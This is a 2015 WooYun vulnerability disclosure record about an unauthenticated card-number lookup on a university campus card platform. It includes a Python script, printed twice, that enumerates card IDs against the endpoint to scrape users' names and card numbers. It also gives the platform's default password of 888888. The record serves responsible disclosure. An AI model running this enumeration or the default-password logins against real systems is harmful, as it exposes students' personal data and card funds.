{"id": 67800, "wybug_id": "wooyun-2015-0141987", "wybug_title": "某校园卡电子服务平台卡号查询功能未授权访问", "wybug_corp": "哈尔滨新中新电子股份有限公司", "wybug_author": "gg_bond", "wybug_date": "2015-09-22 16:16", "wybug_open_date": "2015-11-08 17:36", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-24：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向公众公开  简要描述： 管理员查询用户姓名、卡号的功能可未授权访问，导致攻击者可通过遍历卡号的方式获取所有用户姓名、卡号信息 详细说明：  管理员查询用户姓名、卡号的功能可未授权访问，导致攻击者可通过遍历卡号的方式获取所有用户姓名、卡号信息，关键问题是，这个校园卡服务平台的卡号默认口令为888888，部分用户可能未修改默认口令，导致攻击者获取卡号信息后，可尝试使用默认口令登录，且此平台涉及在线支付功能，与此平台可SSO登录，因此可能影响用户校园卡账户资金。谷歌关键词：校园卡电子服务平台，可获得以下用户存在此问题。山东大学：http://**.**.**.**/Account/SearchUserInfo中国石油大学：http://**.**.**.**/Account/SearchUserInfo河北工业大学：http://**.**.**.**/Account/SearchUserInfo中国海洋大学：http://**.**.**.**/Account/SearchUserInfo西北政法大学：http://**.**.**.**/Account/SearchUserInfo等等等等POC以中国石油大学为例。其他高校信息经POC测试同样有效。\n# -*- coding:utf-8 -*-  import itertoolsimport stringimport reimport requestsimport pdbimport sysreload(sys)sys.setdefaultencoding(\"utf-8\")def getcard():                           #生成用户卡号字典\tchars = string.printable[:10]        #0-9字符组合\tfor i in xrange(1,2):                #定义字典位数\t\tword = itertools.product(chars,repeat=i)\t\tfor cardid in word:\t\t\tno = \"\".join(cardid)        #生成指定位数字典\t\t\tyield no \tdef brutecard(url,cardid):\t\t\t\t#获取用户数据\tpost_data = {'userinfo':cardid}\tr = requests.post(url,post_data)\treturn r.contentdef getresult(result):\t\t\t\t\t#解析结果\tinfo = re.findall(r'<fieldset>.*?</fieldset>',result,re.S)\tif not info:\t\tprint u'无此用户' + '\\n'\telse:\t#print info[1]\t\tdetail = re.findall(r'<p>.*?</p>',info[1],re.S)\t\tfor i in detail:\t\t\tmsg = re.search(r'<label>(.*?)</label>(.*?)</p>',i,re.S)\t\t\tyield  msg.group(1).lstrip() + msg.group(2).lstrip()if __name__ == '__main__':\turl = 'http://**.**.**.**/Account/SearchUserInfo'   #指定URL\tcardno = getcard()\t\t\t#获取卡号\t#pdb.set_trace()\tfor i in cardno:\t\tprint '开始获取用户' +  i + '数据.......' + '\\n' \t\tres = brutecard(url,i)  #尝试获取用户数据\t\tinformation = getresult(res)\t#获取数据\t\tfor p in information:\t\t\tprint p\n\n\n使用弱口令登录查询到的用户\n\n   漏洞证明：  \n\n\n\n\n# -*- coding:utf-8 -*-  import itertoolsimport stringimport reimport requestsimport pdbimport sysreload(sys)sys.setdefaultencoding(\"utf-8\")def getcard():                           #生成用户卡号字典\tchars = string.printable[:10]        #0-9字符组合\tfor i in xrange(1,2):                #定义字典位数\t\tword = itertools.product(chars,repeat=i)\t\tfor cardid in word:\t\t\tno = \"\".join(cardid)        #生成指定位数字典\t\t\tyield no \tdef brutecard(url,cardid):\t\t\t\t#获取用户数据\tpost_data = {'userinfo':cardid}\tr = requests.post(url,post_data)\treturn r.contentdef getresult(result):\t\t\t\t\t#解析结果\tinfo = re.findall(r'<fieldset>.*?</fieldset>',result,re.S)\tif not info:\t\tprint u'无此用户' + '\\n'\telse:\t#print info[1]\t\tdetail = re.findall(r'<p>.*?</p>',info[1],re.S)\t\tfor i in detail:\t\t\tmsg = re.search(r'<label>(.*?)</label>(.*?)</p>',i,re.S)\t\t\tyield  msg.group(1).lstrip() + msg.group(2).lstrip()if __name__ == '__main__':\turl = 'http://**.**.**.**/Account/SearchUserInfo'   #指定URL\tcardno = getcard()\t\t\t#获取卡号\t#pdb.set_trace()\tfor i in cardno:\t\tprint '开始获取用户' +  i + '数据.......' + '\\n' \t\tres = brutecard(url,i)  #尝试获取用户数据\t\tinformation = getresult(res)\t#获取数据\t\tfor p in information:\t\t\tprint p\n   修复方案：  访问控制，严格授权   版权声明：转载请注明来源 gg_bond@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-09-24 17:36 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给赛尔网络，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}